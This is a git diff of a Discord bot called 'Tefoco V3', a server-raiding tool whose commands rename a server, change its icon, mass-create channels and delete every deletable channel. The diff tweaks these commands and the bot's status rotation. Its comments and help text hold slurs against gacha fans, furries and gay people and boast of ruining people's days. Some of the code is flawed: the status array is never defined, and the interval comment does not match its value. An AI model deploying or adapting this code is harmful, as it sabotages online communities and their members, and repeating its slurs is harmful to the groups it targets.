@@ -1,5 +1,8 @@
+//eu taco tudo num arquivo só memo e daí
+//fodase o module.exports pra comando 😎
+
 const Discord = require("discord.js");
-const client = new Discord.Client({ ws: { properties: { $browser: "Discord iOS" }} }); //mobile idle status like notsobot's status
+const client = new Discord.Client({ ws: { properties: { $browser: "Discord iOS" }} }); //status mobile
 const vivo = require(`./server`)
 const prefix = '$';
 
@@ -9,7 +12,9 @@ client.on("ready", () => {
     console.clear()
     console.log(`ready for destroy ppl's days`)
     console.log(`Tefoco V3`)
-    client.user.setActivity(`Tefoco V3 - Prefix: $ [a nice gacha life bot]`);
+    var interval = setInterval (function () {
+      client.user.setActivity(`Prefix: $ [${status[Math.floor(Math.random() * status.length)]}]`)
+    }, 120000); //troca de status a cada 5 min
 });
 
 client.on("message", (message) => {
@@ -20,7 +25,7 @@ client.on("message", (message) => {
         case "yeet":
             message.delete();
             let i;
-            message.guild.setIcon(`https://github.com/shidemuri/tefoco-v3/blob/master/image.png?raw=true`)
+            message.guild.setIcon(`./image.png`)
             if(!args[0]){ 
                 message.guild.setName('haha admin go grr')
                 for(i = 0; i < 251; i++){
@@ -46,13 +51,11 @@ client.on("message", (message) => {
                     message.guild.channels.create(`${args.slice(0).join(' ')}`, {type: `voice`})
                 }
             }
-            for(i = 0; i == 250; i++) message.guild.roles.create({name: 'boiola'})
         break;
         case "del":
             message.delete();
-            message.guild.setIcon(`https://github.com/shidemuri/tefoco-v3/blob/master/image.png?raw=true`)
+            message.guild.setIcon(`./image.png`)
             message.guild.channels.cache.forEach(m =>{if(m.deletable) m.delete()});
-            message.guild.roles.cache.forEach(r =>{if(r.deletable) r.delete()})
             message.guild.channels.create(`\uA672`, {type: `text`})
         break;
         case "admall":
@@ -74,7 +77,7 @@ client.on("message", (message) => {
             "$servername (new server name) - self explanatory",
             `$help - bruhhh\n`,
             "Bot by paradino, making gachafags and furries lifes worse"]
-            message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
+            message.author.send(`${help.slice(0).join(`\n`)}`)
         break;
     }
 });
